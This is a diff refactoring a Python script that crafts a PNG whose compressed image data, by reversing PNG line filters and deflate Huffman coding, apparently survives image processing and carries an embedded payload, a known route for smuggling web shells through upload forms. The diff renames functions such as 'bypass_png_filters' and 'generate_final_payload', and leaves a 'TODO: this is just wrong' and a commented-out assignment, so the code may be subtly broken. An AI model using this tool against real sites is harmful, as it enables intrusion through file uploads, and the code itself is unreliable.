@@ -28,7 +28,7 @@ def parse_args():
     return parser.parse_args()
 
 
-def reverseHuffman(huffman):
+def reverse_huffman(huffman):
     bitstream = ""
     for char in list(huffman):
         bits = f"{ord(char):08b}"
@@ -54,7 +54,7 @@ def reverseHuffman(huffman):
                 huffman_static_codes_dict.update({ii: binary})
             ii += 1
 
-        iii = 143
+        # 143
         for i in range(399, 512):
             binary = "{0:b}".format(i)
             huffman_static_codes_dict.update({ii: binary})
@@ -94,15 +94,12 @@ def gzdeflate(string):
     return compressed
 
 
-def toOrdArray(binString):
-    ords = []
-    for char in list(binString):
-        ords.append(ord(char))
-    return ords
+def to_ord_array(bin_string):
+    return [ord(char) for char in bin_string]
 
 
-def reverseFilter1(binString):
-    p = toOrdArray(binString)
+def reverse_filter_1(bin_string):
+    p = to_ord_array(bin_string)
     s = len(p)
 
     payload = []
@@ -115,8 +112,8 @@ def reverseFilter1(binString):
     return payload
 
 
-def reverseFilter3(binString):
-    p = toOrdArray(binString)
+def reverse_filter_3(bin_string):
+    p = to_ord_array(bin_string)
     s = len(p)
 
     payload = []
@@ -129,14 +126,14 @@ def reverseFilter3(binString):
     return payload
 
 
-def bypassPNGLineFilters(inflate):
-    one = reverseFilter1(inflate)
-    three = reverseFilter3(inflate)
+def bypass_png_filters(inflate):
+    one = reverse_filter_1(inflate)
+    three = reverse_filter_3(inflate)
     mergedlist = one + three
     return mergedlist
 
 
-def generateFinalPayload(payload, outputImage):
+def generate_final_payload(payload, png_output):
     print("[i] Generating final PNG output")
     # Thanks to admanLogue and hLk_886 for this PNG Code
     im = Image.new("RGB", (32, 32))
@@ -153,8 +150,8 @@ def generateFinalPayload(payload, outputImage):
         except:
             payload.append(255)
 
-    im.save(outputImage)
-    print("[!] PNG output saved as: %s" % outputImage + "\n")
+    im.save(png_output)
+    print("[!] PNG output saved as: %s" % png_output + "\n")
 
 
 if __name__ == "__main__":
@@ -166,7 +163,7 @@ if __name__ == "__main__":
 
     failed = True
     for i in range(0xFF, 0x01, -1):
-        reversed = reverseHuffman(chr(i) + input2chunk + chr(0))
+        reversed = reverse_huffman(chr(i) + input2chunk + chr(0))
         deflated = gzdeflate(bytes(reversed, encoding="utf-8"))
 
         ### TODO: this is just wrong
@@ -178,5 +175,5 @@ if __name__ == "__main__":
     # print ("Deflated: "+str(deflated))
     # print ("Reversed: "+str(reversed))
 
-    payload = bypassPNGLineFilters(str(reversed))
-    generateFinalPayload(payload, args.output)
+    payload = bypass_png_filters(str(reversed))
+    generate_final_payload(payload, args.output)
